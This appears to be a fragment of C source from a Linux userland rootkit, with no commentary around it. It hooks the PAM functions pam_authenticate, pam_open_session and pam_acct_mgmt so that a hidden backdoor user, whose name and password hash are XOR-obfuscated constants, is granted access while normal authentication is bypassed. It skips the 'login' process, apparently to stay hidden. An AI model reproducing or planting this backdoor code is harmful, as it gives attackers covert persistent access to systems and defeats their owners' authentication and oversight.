int pam_authenticate(pam_handle_t *pamh, int flags)
{
    HOOK(o_pam_authenticate, CPAM_AUTHENTICATE);
    void *user;
    pam_get_item(pamh, PAM_USER, (const void **)&user);
    if((char *)user == NULL) return o_pam_authenticate(pamh, flags);

    char *bduname = strdup(BD_UNAME); xor(bduname);
    if(!strcmp((char *)user, bduname))
    {
        if(!strcmp(cprocname(), "login")){ CLEAN(bduname); return o_pam_authenticate(pamh, flags); }
        char prompt[512], *pw;
        snprintf(prompt, sizeof(prompt), "* Password for %s: ", bduname);
        CLEAN(bduname);
        pam_prompt(pamh, 1, &pw, "%s", prompt);

        char *bdpwd=strdup(BD_PWD); xor(bdpwd);
        if(!strcmp(crypt(pw, bdpwd), bdpwd)) { CLEAN(bdpwd); return PAM_SUCCESS; }
        CLEAN(bdpwd);
        return PAM_USER_UNKNOWN;
    }
    CLEAN(bduname);
    return o_pam_authenticate(pamh, flags);
}

int pam_open_session(pam_handle_t *pamh, int flags)
{
    HOOK(o_pam_open_session, CPAM_OPEN_SESSION);

    void *user;
    pam_get_item(pamh, PAM_USER, (const void **)&user);
    if((char *)user == NULL) return o_pam_open_session(pamh, flags);

    char *bduname=strdup(BD_UNAME); xor(bduname);
    if(!strcmp(user, bduname)) { CLEAN(bduname); return PAM_SUCCESS; }
    CLEAN(bduname);

    return o_pam_open_session(pamh, flags);
}

int pam_acct_mgmt(pam_handle_t *pamh, int flags)
{
    HOOK(o_pam_acct_mgmt, CPAM_ACCT_MGMT);

    void *user;
    pam_get_item(pamh, PAM_USER, (const void **)&user);
    if((char *)user == NULL) return o_pam_acct_mgmt(pamh, flags);

    char *bduname = strdup(BD_UNAME); xor(bduname);
    if(!strcmp(user, bduname)) { CLEAN(bduname); return PAM_SUCCESS; }
    CLEAN(bduname);

    return o_pam_acct_mgmt(pamh, flags);
}
